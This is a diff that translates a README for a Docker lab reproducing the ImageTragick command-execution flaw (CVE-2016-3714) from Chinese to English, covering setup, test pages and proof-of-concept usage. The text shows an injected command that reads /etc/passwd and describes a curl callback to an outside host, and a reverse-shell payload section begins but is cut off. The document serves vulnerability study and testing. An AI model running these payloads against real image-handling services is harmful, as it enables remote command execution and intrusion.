@@ -1,31 +1,38 @@
-# Imagetragick 命令执行漏洞（CVE-2016–3714）
+# Imagetragick Command Execution Vulnerability (CVE-2016–3714)
 
-详情见 https://imagetragick.com/ 和 https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html ，不再描述原理。
+[中文版本(Chinese version)](README.zh-cn.md)
 
-## 测试方法
+Referers:
 
-一些测试使用的POC：https://github.com/ImageTragick/PoCs
+- https://imagetragick.com/
+- https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html
 
-编译及启动测试环境：
+## Environment Setup
+
+Enter the following commands:
 
 ```
 docker-compose build
 docker-compose up -d
 ```
 
-访问`http://your-ip/`可见有三个文件：
+Visit `http://your-ip/` and you'll see three files:
 
 ```bash
-├── demo.php # 使用vul.jpg+identify命令测试 
-├── upload.php # 支持用户进行上传，并将上传的文件传入PHP的imagick扩展，触发漏洞
-└── vul.jpg # 一个简单的POC
+├── demo.php # use vul.jpg + identify command to test 
+├── upload.php # Support users to upload a file，deliver it to PHP's imagick extension, and then the vulnerability will be triggered
+└── vul.jpg # a simple POC
 ```
 
-首先访问`http://your-ip/demo.php`，命令并没有回显，但在docker容器中，已经成功得到`/tmp/success`文件：
+## POC
+
+Some POCs used: https://github.com/ImageTragick/PoCs
+
+You can take a test by visiting `http://your-ip/demo.php`. Even though the command executed (`cat /etc/passwd > /tmp/success`) doesn't have a specific character in the response, the `/tmp/success` file is successfully created in the docker container:
 
 ![](1.png)
 
-再访问`http://your-ip/upload.php`测试，上传POC文件，数据包如下（**注意，我换了一个POC**）：
+Also you can visit `http://your-ip/upload.php` to test another POC. Upload the POC file and packets are as follows（**Attention: this is another POC**）：
 
 ```
 POST /upload.php HTTP/1.1
@@ -51,11 +58,11 @@ pop graphic-context
 
 ```
 
-可见，`www.leavesongs.com:8889`已经接收到http请求，说明curl命令执行成功：
+As shown, `www.leavesongs.com:8889` has received the http request, proving that the curl command is executed successfully：
 
 ![](2.png)
 
-反弹shell POC：
+POC of getting a shell：
 
 ```
 push graphic-context
